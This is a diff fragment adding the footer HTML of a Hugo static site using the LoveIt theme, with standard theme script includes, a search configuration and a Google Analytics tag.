+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://elf1337.github.io/" target="_blank">Akhil</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://elf1337.github.io/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="https://elf1337.github.io/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/lightgallery/plugins/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/lightgallery/plugins/lg-zoom.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="https://elf1337.github.io/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="https://elf1337.github.io/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-DG7ZT42QC1', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-DG7ZT42QC1" async></script></body>
+</html>
